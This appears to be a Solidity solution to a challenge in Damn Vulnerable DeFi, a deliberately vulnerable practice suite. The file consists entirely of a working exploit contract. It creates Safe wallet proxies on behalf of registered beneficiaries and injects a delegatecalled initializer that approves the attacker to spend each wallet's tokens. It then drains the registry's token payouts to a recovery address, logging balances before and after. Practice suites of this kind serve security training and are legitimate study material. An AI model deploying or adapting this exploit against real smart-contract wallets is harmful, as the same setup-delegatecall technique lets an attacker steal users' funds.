// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {WalletRegistry} from "../WalletRegistry.sol";
import {Safe} from "@safe-global/safe-smart-account/contracts/Safe.sol";
import {SafeProxy} from "@safe-global/safe-smart-account/contracts/proxies/SafeProxy.sol";
import {SafeProxyFactory} from "@safe-global/safe-smart-account/contracts/proxies/SafeProxyFactory.sol";
import {DamnValuableToken} from "../../../src/DamnValuableToken.sol";
import {console2} from "forge-std/console2.sol";

contract AttackWalletRegistry {
    uint256 private constant EXPECTED_THRESHOLD = 1;
    uint256 private constant PAYMENT_AMOUNT = 10e18;

    constructor(
        WalletRegistry _walletRegistry,
        Safe _signletonCopy,
        SafeProxyFactory _walletFactory,
        DamnValuableToken _token,
        address _recovery,
        address[] memory _beneficiaries
    ) {
        console2.log("wallet registry balance before attack: ", _token.balanceOf(address(_walletRegistry)));
        for (uint256 i = 0; i < _beneficiaries.length; i++) {
            address[] memory owners = createOwners(_beneficiaries, i);
            bytes memory initializer = createInitializer(owners, _token);
            SafeProxy createdProxy =
                _walletFactory.createProxyWithCallback(address(_signletonCopy), initializer, i, _walletRegistry);
            _token.transferFrom(address(createdProxy), address(this), PAYMENT_AMOUNT);
            _token.transfer(address(_recovery), PAYMENT_AMOUNT);
        }
        console2.log("wallet registry balance after attack: ", _token.balanceOf(address(_walletRegistry)));
    }

    function createOwners(address[] memory _beneficiaries, uint256 i) internal pure returns (address[] memory owners) {
        owners = new address[](1);
        owners[0] = _beneficiaries[i];
    }

    function createInitializer(address[] memory owners, DamnValuableToken _token) internal returns (bytes memory) {
        Initializer initializer = new Initializer(address(this));
        address to = address(initializer);
        bytes memory data = abi.encodeWithSelector(Initializer.approveDvtToken.selector, _token);
        return abi.encodeWithSelector(
            Safe.setup.selector, owners, EXPECTED_THRESHOLD, to, data, address(0), address(0), 0, address(0)
        );
    }

    function approveDvtToken(address attacker, DamnValuableToken token) external {
        token.approve(attacker, PAYMENT_AMOUNT);
    }
}

contract Initializer {
    address private immutable attacker;
    uint256 private constant PAYMENT_AMOUNT = 10e18;

    constructor(address _attacker) {
        attacker = _attacker;
    }

    function approveDvtToken(DamnValuableToken token) external {
        token.approve(attacker, PAYMENT_AMOUNT);
    }
}
